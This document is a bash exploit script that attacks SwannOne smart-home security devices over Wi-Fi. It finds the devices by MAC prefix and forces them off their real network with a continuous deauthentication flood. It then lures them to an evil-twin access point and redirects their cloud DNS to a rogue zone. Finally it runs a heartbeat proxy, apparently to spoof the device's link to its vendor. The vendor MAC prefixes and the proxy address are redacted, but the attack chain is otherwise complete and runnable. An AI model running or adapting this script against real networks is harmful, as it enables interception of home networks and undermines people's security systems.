#!/bin/bash
## SWO_exploit.sh for SWO_exploit
## 
## Made by SRJanel
## Login SRJanel <n******.******s>
## 
## Started on  Wed Jul 11 11:46:25 2018 
## Last update Sat Apr 27 11:14:37 2019 
##

SWO_OUI1=XX:XX:X1 # removed for security precautions
SWO_OUI2=XX:XX:X2 # removed for security precautions

FILENAME_AIRODUMP_OUTPUT=airodump_ng_output
TIME_AIR_SCANNING=42
TIME_BERLIN=$TIME_AIR_SCANNING
GEOMETRY1="70x20+12+638"
GEOMETRY2="70x20+468+638"
GEOMETRY3="70x20+924+638"

usage()
{
    local program_name="./${0##*/}"
    echo $program_name "[IFACE]"
}

scan()
{
    echo "[*] Putting interface '$IFACE' into monitor mode"
    MONITOR_IFACE=`sudo airmon-ng start $IFACE | grep -i "monitor mode" | grep -i "enabled" | awk 'NF>1{print $NF}'| sed 's/.$//' | cut -d']' -f2` || { echo "[-] FATAL ERROR: could not put '$IFACE' into monitor mode"; exit 1; }
    echo "[*] Scanning the air for $TIME_AIR_SCANNING seconds"
    (sudo airodump-ng --berlin $TIME_BERLIN -w $FILENAME_AIRODUMP_OUTPUT --output-format csv $MONITOR_IFACE 2>/dev/null &)
    sleep $TIME_AIR_SCANNING
    sudo kill -9 `pidof airodump-ng` &>/dev/null
    reset
    detect_swann
}

detect_swann()
{
    local client_infos=`cat "$FILENAME_AIRODUMP_OUTPUT"*.csv | egrep -i "$SWO_OUI1|$SWO_OUI2"`

    [[ -z $client_infos ]] && { echo "[-] ERROR: No SwannOne MAC address was detected."; sudo airmon-ng stop $MONITOR_IFACE; rm "$FILENAME_AIRODUMP_OUTPUT"*.csv; exit 1; }
#    echo "[*] Putting monitor interface '$MONITOR_IFACE' down"
    sudo airmon-ng stop $MONITOR_IFACE &>/dev/null
    grab_infos "$client_infos"
}

grab_infos()
{
    SWO_MAC_ADDRESS=`echo $(echo $1 | cut -d',' -f1)`
    AP_MAC_ADDRESS=`echo $(echo $1 | cut -d',' -f6)`
    local ap_infos=`cat "$FILENAME_AIRODUMP_OUTPUT"*.csv | grep -i $AP_MAC_ADDRESS -m1`
    AP_CHANNEL=`echo $(echo $ap_infos | cut -d',' -f4)`
    AP_ENCRYPTION_MECHANISM=`echo $(echo $ap_infos | cut -d',' -f6 | awk '{print tolower($0)}')`
    AP_SECURITY_STANDARD=`echo $(echo $ap_infos | cut -d',' -f7 | awk '{print tolower($0)}')`
    AP_SSID=`echo $(echo $ap_infos | cut -d',' -f14)`
    echo "SWO_MAC_ADDRESS: $SWO_MAC_ADDRESS"
    echo "AP_MAC_ADDRESS: $AP_MAC_ADDRESS"
    echo "AP_CHANNEL: $AP_CHANNEL"
    echo "AP_ENCRYPTION_MECHANISM: $AP_ENCRYPTION_MECHANISM"
    echo "AP_SECURITY_STANDARD: $AP_SECURITY_STANDARD"
    echo "AP_SSID: $AP_SSID"
    if [[ $AP_CHANNEL -lt 0 ]]; then
	echo "[-] Probably an error occured"
	exit 1
    fi
}

change_channel()
{
    local channel="$1"

    sudo ifconfig $IFACE down
    sudo iwconfig $IFACE channel $channel
    sudo ifconfig $IFACE up
    echo "[*] Changed channel to channel '$channel' for '$IFACE'"
}

prepare_conf_files()
{
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    
    sudo cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.BACK_UP
    sudo cp files/dhcpd.conf /etc/dhcp/dhcpd.conf
    sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.BACK_UP
    sudo cp files/isc-dhcp-server /etc/default/isc-dhcp-server

    sudo cp /etc/bind/named.conf.local /etc/bind/named.conf.local.BACK_UP
    sudo cp files/named.conf.local /etc/bind/named.conf.local
    sudo cp files/db.sct.swann.intamac.com /etc/bind/db.sct.swann.intamac.com
    sudo service bind9 restart
}

cleanup()
{
    rm "$FILENAME_AIRODUMP_OUTPUT"*.csv
    sudo kill -9 `pidof airbase-ng aireplay-ng` &>/dev/null
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
    sudo iptables -D FORWARD -i at0 -j ACCEPT
    sudo iptables -t nat -D POSTROUTING -j MASQUERADE
    sudo route del -net 192.168.27.0 netmask 255.255.255.0 gw 192.168.27.1

    sudo service isc-dhcp-server stop
    sudo mv /etc/dhcp/dhcpd.conf.BACK_UP /etc/dhcp/dhcpd.conf
    sudo mv /etc/default/isc-dhcp-server.BACK_UP /etc/default/isc-dhcp-server

    sudo service bind9 stop
    sudo rm /etc/bind/db.sct.swann.intamac.com
    sudo mv /etc/bind/named.conf.BACK_UP /etc/bind/named.conf.local
}

make_evil_twin()
{
    declare -a encryption_standard=("wep40" "tkip" "wrap" "ccmp" "wep104")
    local string="-z"
    [[ $AP_ENCRYPTION_MECHANISM == "wpa2" ]] && string="-Z"

    change_channel $AP_CHANNEL

    counter=0
    for enc in "${encryption_standard[@]}"; do
	counter=$((counter + 1))
	if [[ $enc == $AP_SECURITY_STANDARD ]]; then
	    string="$string $counter"
	fi
    done

    local command=`echo "sudo airbase-ng -e $AP_SSID -a 00:11:22:33:44:55 -W 1 $string $IFACE -c $AP_CHANNEL"`
    sudo xterm -geometry $GEOMETRY2 -e "$command" &

    sleep 8	# Waiting for airbase to spawn at0
    sudo ifconfig at0 192.168.27.1 netmask 255.255.255.0
    sudo route add -net 192.168.27.0 netmask 255.255.255.0 gw 192.168.27.1
    sudo iptables --table nat --append POSTROUTING -o eth0 -j MASQUERADE
    sudo iptables --append FORWARD -i at0 -j ACCEPT
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    sudo service isc-dhcp-server restart 
}

deauth_real_AP()
{
    local command=`echo "aireplay-ng --deauth 0 -a $AP_MAC_ADDRESS -c $SWO_MAC_ADDRESS $IFACE"`

    sudo xterm -geometry $GEOMETRY1 -e "$command" &
    sleep 2
}

launch_SWO_heartbeat_attack()
{
    ## Launching Wireshark to watch the process and also debug
    sudo wireshark -i at0 -k -Y '(bootp.option.type == 53 || dns || tcp || eapol) && !tcp.analysis.duplicate_ack && ! tcp.analysis.retransmission' &

    # IP and PORT removed for security precautions.
    local command=`echo "python ./IoTHeartbeatProxy/HeartbeatProxy.py -t 30 -p XXXX -d YYY.YYY.YYY.YYY"`

    xterm -geometry $GEOMETRY3 -e "$command"
}

init()
{
    if [[ $# -ne 1 ]]; then
    	usage
    	exit 1
    fi
    IFACE="$1"
    ifconfig $IFACE &>/dev/null || { echo "[-] ERROR: Could not find interface '$IFACE'."; exit 1; }
    local parent_path=$(cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P)
    cd "$parent_path"
    sudo airmon-ng check kill
    reset
}

main()
{
    init "$@"
    scan
    prepare_conf_files
    make_evil_twin
    deauth_real_AP
    launch_SWO_heartbeat_attack
    cleanup
}

main "$@"
